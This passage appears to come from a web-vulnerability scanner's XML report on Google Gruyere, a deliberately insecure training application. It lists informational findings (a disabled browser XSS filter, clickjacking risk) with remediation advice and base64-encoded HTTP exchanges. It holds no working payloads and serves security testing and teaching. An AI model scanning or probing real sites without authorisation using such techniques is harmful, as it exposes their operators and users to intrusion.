0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPHNjcmlwdCBzcmM9Ii80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzIiB0ZXh0PSJ0ZXh0L2phdmFzY3JpcHQiPgo8L3NjcmlwdD4KPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMiBjbGFzcz0naGFzLXJlZnJlc2gnPkdydXllcmU6IEhvbWU8L2gyPgo8ZGl2IGNsYXNzPSdyZWZyZXNoJz48YSBjbGFzcz0nYnV0dG9uJyBvbmNsaWNrPSdfcmVmcmVzaEhvbWUoIjQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNiIpJyBocmVmPScjJz5SZWZyZXNoPC9hPjwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+Cjx0YWJsZSB3aWR0aD0nMTAwJSc+CgogIDx0cj48dGQgY29sc3Bhbj0nMyc+PGI+TW9zdCByZWNlbnQgc25pcHBldHM6PC9iPjwvdGQ+PC90cj4KCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsdWUnPkNoZWRkYXIgTWFjPC9zcGFuPjwvYj4KICAgIDwvdGQ+CiAgICA8dGQgd2lkdGg9JzEwMCUnPjxzcGFuIGlkPSdjaGVkZGFyJz5HcnV5ZXJlIGlzIHRoZSBjaGVlc2llc3QgYXBwbGljYXRpb24gb24gdGhlIHdlYi48L3NwYW4+CiAgICA8YnI+CiAgICAgICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bD91aWQ9Y2hlZGRhcic+QWxsIHNuaXBwZXRzPC9hPiZuYnNwOwogICAgICA8YSBocmVmPSdodHRwczovL2ltYWdlcy5nb29nbGUuY29tLz9xPWNoZWRkYXIrY2hlZXNlJz5Ib21lcGFnZTwvYT4KICAgIDxicj4KICAgIDxicj4KICAgIDwvdGQ+CiAgPC90cj4KCgoKCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZSc+QnJpZTwvc3Bhbj48L2I+CiAgICA8L3RkPgogICAgPHRkIHdpZHRoPScxMDAlJz48c3BhbiBpZD0nYnJpZSc+QnJpZSBpcyB0aGUgcXVlZW4gb2YgdGhlIGNoZWVzZXM8c3BhbiBzdHlsZT1jb2xvcjpyZWQ+ISEhPC9zcGFuPjwvc3Bhbj4KICAgIDxicj4KICAgICAgICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllJz5BbGwgc25pcHBldHM8L2E+Jm5ic3A7CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+SG9tZXBhZ2U8L2E+CiAgICA8YnI+CiAgICA8YnI+CiAgICA8L3RkPgogIDwvdHI+CgoKPC90YWJsZT4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>684514331996096</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGIyMDRlOGUwZDRiNjk2ZDMzNTZmNzE5ZTA0NDg2MWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNDAwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4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]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7146252009582486528</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGIyMDRlOGUwZDRiNjk2ZDMzNTZmNzE5ZTA0NDg2MWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNDAwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHB